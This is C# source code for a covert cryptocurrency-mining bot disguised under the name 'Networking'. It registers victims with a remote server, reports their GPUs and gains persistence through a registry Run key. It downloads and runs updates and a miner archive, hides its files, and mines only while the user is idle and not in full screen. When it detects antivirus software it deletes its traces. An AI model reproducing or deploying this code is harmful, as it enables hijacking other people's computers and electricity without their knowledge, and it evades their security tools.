using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Networking
{
    class Program
    {
        //Application Data (Location, Name....etc)
        public static string ApplicationName = "Networking";
        public static string ExecutableName = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
        public static string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory + "\\" + ExecutableName;
        public static string InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Networking\\";
        public static string Zip_FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Networking.zip";

        public static string Link = "http://static-urdrive.ddns.net/Bots/index.php"; //108.162.72.165/UrDrive/ - Cloud.HazardsHub.com/

        public static string Username = FingerPrint.Value();
        public static string Password = Environment.MachineName;

        public static bool Mining = false;

        public static string version = "10";

        // Steps 2 and 3
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        static void Main(string[] args)
        {
            RunTime();
        }

        private static void OnSessionExit(object sender, SessionEndingEventArgs e)
        {
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    SendStatus("User Logged Off");
                    break;

                case SessionEndReasons.SystemShutdown:
                    SendStatus("System Shutdown");
                    break;
            }
        }

        private static void OnProcessExit(object sender, EventArgs e)
        {
            SendStatus("Process Exited");
        }

        public static async void RunTime()
        {
            Main:
            Thread.Sleep(1000);

            Process[] check = Process.GetProcessesByName("networking");
            if (check.Length > 1)
            {
                Environment.Exit(1);

                return;
            }

            SystemEvents.SessionEnding += OnSessionExit;
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe"))
            {
                try
                {
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: Deleting Updater.exe");
                    Console.WriteLine(ex.ToString());
                }
            }

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking_New.exe"))
            {
                try
                {
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking_New.exe");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: Deleting Updater.exe");
                    Console.WriteLine(ex.ToString());
                }
            }

            WebClient webClient = new WebClient();

            string Request = DownloadString(Link + "?Request=Login&Username=" + Username + "&Password=" + Password);

            Console.WriteLine(Request + " - " + Username + " - " + Password);

            if (Request == null)
                goto Main;
            else if (Request != "Login Found")
            {
                Request = DownloadString(Link + "?Request=Register&Username=" + Username + "&Password=" + Password);

                Console.WriteLine(Request);

                if (Request == null)
                    goto Main;
                else if (Request != "Registration Successful")
                {
                    Thread.Sleep(5000);

                    goto Main;
                }
            }

            Request = DownloadString(Link + "?Request=GPU&Username=" + Username + "&Password=" + Password + "&GPUS=" + GetGPUs());

            Console.WriteLine(Request);

            if (Request == null)
                goto Main;

            while (true)
            {
                Loop:

                bool AntiVirus = true;

                try
                {
                    ManagementObjectSearcher MySearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM " + "AntiVirusProduct");

                    foreach (ManagementObject queryObj in MySearcher.Get())
                    {
                        string name = "";
                        string productstate = "";

                        foreach (PropertyData propertyData in queryObj.Properties)
                        {
                            if (propertyData.Name.ToString() == "displayName" && propertyData.Value.ToString() != "Windows Defender")
                            {
                                name = propertyData.Value.ToString();
                            }
                            else if (propertyData.Name.ToString() == "productState" && propertyData.Value.ToString() == "266240")
                            {
                                productstate = propertyData.Value.ToString();
                            }
                        }

                        if (name != "Windows Defender" && productstate == "266240")
                        {
                            AntiVirus = false;

                            Console.WriteLine("AntiVirus Installed");

                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Failed to check for AntiVirus's");
                    Console.WriteLine(ex.ToString());
                }

                if (AntiVirus)
                {
                    string commandArg = string.Format("\"{0}\"", ExecutablePath.Replace(@"\\", @"\"));

                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        Object o = rk.GetValue(ApplicationName);
                        if (o != null)
                        {
                            try
                            {
                                string Startup = o.ToString();

                                if (Startup != commandArg)
                                {
                                    rk.DeleteValue(ApplicationName);

                                    Thread.Sleep(500);

                                    rk.SetValue(ApplicationName, commandArg);
                                }
                            }
                            catch
                            {

                            }
                        }
                        else
                        {
                            try
                            {
                                rk.SetValue(ApplicationName, commandArg);
                            }
                            catch
                            {

                            }
                        }
                    }

                    Request = DownloadString(Link + "?Request=Version&File=Networking");

                    Console.WriteLine(Request);

                    if (Request == null)
                        goto Main;
                    else if (Request != version)
                    {
                        Console.WriteLine("Oudated - Running Updater");

                        try
                        {
                            if (!(await DownloadFileAsync(new Uri(Link + "?Request=Download&File=Networking.exe"), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking_New.exe")))
                            {
                                goto Loop;
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Download Failed:");
                            Console.WriteLine(ex.ToString());

                            goto Loop;
                        }

                        Thread.Sleep(1000);

                        Console.WriteLine("Setting Attributes");

                        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking_New.exe", FileAttributes.Hidden | FileAttributes.System);

                        Console.WriteLine("Writing Updater");

                        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe"))
                            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe", Files.Updater);

                        Thread.Sleep(1000);

                        Console.WriteLine("Setting Attributes on Updater");

                        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe", FileAttributes.Hidden | FileAttributes.System);

                        Console.WriteLine("Starting Updater");

                        Process process = new Process();
                        ProcessStartInfo startInfo = new ProcessStartInfo()
                        {
                            WorkingDirectory = Environment.CurrentDirectory,
                            UseShellExecute = false,
                            FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Updater.exe",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        };
                        process.StartInfo = startInfo;
                        process.Start();

                        Environment.Exit(0);
                    }
                    else
                    {
                        //Log Client -> Server Version
                        Console.WriteLine("Server: " + Request + " | Client: " + version);

                        SendVersion(version); //Log Version of BTC Miner - Just so ik updates are working properly and who's active
                    }

                    if (!Directory.Exists(InstallPath))
                    {
                        Directory.CreateDirectory(InstallPath);
                    }

                    if (!File.Exists(Zip_FileName) || !File.Exists(InstallPath + "networking_service.exe"))
                    {
                        if (!File.Exists(InstallPath + "networking_service.exe"))
                        {
                            Directory.Delete(InstallPath, true);

                            Thread.Sleep(500);

                            Directory.CreateDirectory(InstallPath);
                        }

                        if (!File.Exists(Zip_FileName) || !CheckZIP())
                        {
                            try
                            {
                                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking.zip");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Delete Failed:");
                                Console.WriteLine(ex.ToString());

                                goto Loop;
                            }

                            if (!(await DownloadFileAsync(new Uri(Link + "?Request=Download&File=Networking.zip"), Zip_FileName)))
                            {
                                goto Loop;
                            }

                            Thread.Sleep(1000);
                        }

                        try
                        {
                            ZipFile.ExtractToDirectory(Zip_FileName, InstallPath);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Extract Failed:");
                            Console.WriteLine(ex.ToString());
                        }
                    }
                    else
                    {
                        Console.WriteLine("Miner Exists -> Checking Hash");

                        Request = DownloadString(Link + "?Request=Hash&Username=" + Username + "&Password=" + Password + "&File=Networking.zip");

                        Console.WriteLine("Comparing File Hashes -> " + Request.ToUpper() + " == " + M5DHash(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking.zip"));

                        if (Request == null)
                            goto Main;
                        else if (Request.ToUpper() != M5DHash(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking.zip"))
                        {
                            Console.WriteLine("Networking.zip is outdated, updating!");

                            try
                            {
                                Directory.Delete("Networking", true);
                                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking.zip");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Delete Failed:");
                                Console.WriteLine(ex.ToString());

                                goto Loop;
                            }

                            try
                            {
                                if (!(await DownloadFileAsync(new Uri(Link + "?Request=Download&File=Networking.zip"), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + "Networking.zip")))
                                {
                                    goto Loop;
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Download Failed:");
                                Console.WriteLine(ex.ToString());

                                goto Loop;
                            }
                        }
                        else
                        {
                            Console.WriteLine("Hashes are the same, files are correct and up to date!");
                        }

                        if (!CheckZIP())
                        {
                            try
                            {
                                Directory.Delete(InstallPath, true);
                                File.Delete(Zip_FileName);

                                Thread.Sleep(500);

                                Directory.CreateDirectory(InstallPath);

                                Console.WriteLine("Corrupted, redownloading!");

                                if (!(await DownloadFileAsync(new Uri(Link + "?Request=Download&File=Networking.zip"), Zip_FileName)))
                                {
                                    goto Loop;
                                }

                                Console.WriteLine("Downloading Complete!");

                                Thread.Sleep(1000);

                                try
                                {
                                    ZipFile.ExtractToDirectory(Zip_FileName, InstallPath);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("Extract Failed:");
                                    Console.WriteLine(ex.ToString());
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("ReDownload Failed:");
                                Console.WriteLine(ex.ToString());
                            }
                        }
                        else
                        {
                            if (!Directory.Exists(InstallPath))
                            {
                                Directory.CreateDirectory(InstallPath);

                                try
                                {
                                    ZipFile.ExtractToDirectory(Zip_FileName, InstallPath);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("Extract Failed:");
                                    Console.WriteLine(ex.ToString());
                                }
                            }
                        }
                    }

                    LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                    lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);

                    DateTime today = DateTime.Today;

                    if (GetIdleTime() > 300000 && !FullScreen.IsForegroundFullScreen() && NvidiaGPU()) //300000
                    {
                        Process[] processes = Process.GetProcessesByName("networking_service");
                        if (processes.Length == 0)
                        {
                            try
                            {
                                Process process = new Process();
                                ProcessStartInfo startInfo = new ProcessStartInfo()
                                {
                                    WorkingDirectory = InstallPath,
                                    UseShellExecute = false,
                                    FileName = InstallPath + "Run.bat",
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    CreateNoWindow = true
                                };
                                //startInfo.Verb = "runas";
                                process.StartInfo = startInfo;
                                process.Start();

                                Mining = true;

                                SendStatus("Mining");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Error: Starting Miner");
                                Console.WriteLine(ex.ToString());
                            }
                        }
                        else
                        {
                            Mining = true;

                            Console.WriteLine("Miner Running - Computer Idle for " + GetIdleTime());
                        }
                    }
                    else
                    {
                        if (Mining)
                        {
                            Mining = false;
                        }

                        Process[] processes = Process.GetProcessesByName("networking_service");
                        if (processes.Length > 0)
                        {
                            foreach (Process process in processes)
                            {
                                bool closed = false;

                                try
                                {
                                    process.Kill();

                                    closed = true;
                                }
                                catch
                                {

                                }

                                if (!closed)
                                    Console.WriteLine("Error Closing networking_service");
                            }
                        }

                        if (GetIdleTime() < 300000)
                            SendStatus("Miner Idle ( Idle Time: " + GetIdleTime() + " )");
                        else if (FullScreen.IsForegroundFullScreen())
                            SendStatus("Miner Idle - Fullscreen");
                        else if (NvidiaGPU())
                            SendStatus("Miner Idle - Not Nvidia");
                    }
                }
                else
                {
                    Process[] processes = Process.GetProcessesByName("networking_service");
                    if (processes.Length > 0)
                    {
                        foreach (Process process in processes)
                        {
                            bool closed = false;

                            try
                            {
                                process.Kill();

                                closed = true;
                            }
                            catch
                            {

                            }

                            if (!closed)
                                Console.WriteLine("Error Closing networking_service");
                        }
                    }

                    try
                    {
                        if (Directory.Exists(InstallPath))
                        {
                            Directory.Delete(InstallPath, true);
                        }

                        if (File.Exists(Zip_FileName))
                        {
                            File.Delete(Zip_FileName);
                        }
                    }
                    catch
                    {

                    }
                }

                if (Directory.Exists(InstallPath))
                    File.SetAttributes(InstallPath, FileAttributes.Hidden | FileAttributes.System);

                if (File.Exists(Zip_FileName))
                    File.SetAttributes(Zip_FileName, FileAttributes.Hidden | FileAttributes.System);

                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Networking.exe"))
                    File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Networking.exe", FileAttributes.Hidden | FileAttributes.System);

                Thread.Sleep(5000);
            }
        }

        private static void OnSessionExit(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }

        public static bool NvidiaGPU()
        {
            bool NvidiaGPU = false;
            ManagementObjectSearcher objvide = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");

            foreach (ManagementObject obj in objvide.Get())
            {
                if (obj["Name"].ToString().ToLower().Contains("nvidia"))
                {
                    NvidiaGPU = true;

                    break;
                }
            }

            return NvidiaGPU;
        }

        public static string GetGPUs()
        {
            string GPUList = "";

            ManagementObjectSearcher objvide = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");

            int count = 1;
            foreach (ManagementObject obj in objvide.Get())
            {
                if (count == objvide.Get().Count)
                    GPUList += obj["Name"].ToString();
                else
                    GPUList += obj["Name"].ToString() + ", ";

                count++;
            }

            return GPUList;
        }

        public static string M5DHash(string filename)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(filename))
                {
                    return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
                }
            }
        }

        public static bool CheckZIP()
        {
            try
            {
                string zipPath = Zip_FileName;
                ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Read);
                archive.Dispose();

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("ZIP Corrupted");
                Console.WriteLine(ex.ToString());

                return false;
            }
        }

        public static async Task<bool> DownloadFileAsync(Uri uri, string path)
        {
            try
            {
                bool completed = false;
                using (var client = new WebClient())
                {
                    client.DownloadFileCompleted += (sender, e) =>
                    {
                        Console.WriteLine("");

                        completed = true;
                    };

                    client.DownloadProgressChanged += (sender, e) =>
                    {
                        Console.Write("\rDownload Progress: " + e.ProgressPercentage);
                    };

                    client.DownloadFileAsync(uri, path);

                    while (!completed)
                    {
                        Thread.Sleep(500);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Download Failed!");
                Console.WriteLine(ex.ToString());

                return false;
            }

            return true;
        }

        public static string DownloadString(string URL)
        {
            WebClient webClient = new WebClient();

            try
            {
                string Request = webClient.DownloadString(URL);

                if (Request != null)
                {
                    return Request;
                }
                else
                {
                    Console.WriteLine("Request Response Returned Null");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Request Response Failed");
                Console.WriteLine(ex.ToString());
            }

            return null;
        }

        public static void SendStatus(string status)
        {
            WebClient webClient = new WebClient();

            string Request = DownloadString(Link + "?Request=Status&Username=" + Username + "&Password=" + Password + "&Status=" + status);

            Console.WriteLine(Request);
        }

        public static void SendVersion(string version)
        {
            WebClient webClient = new WebClient();

            string Request = DownloadString(Link + "?Request=SendVersion&Username=" + Username + "&Password=" + Password + "&Version=" + version);

            Console.WriteLine(Request);
        }
    }
}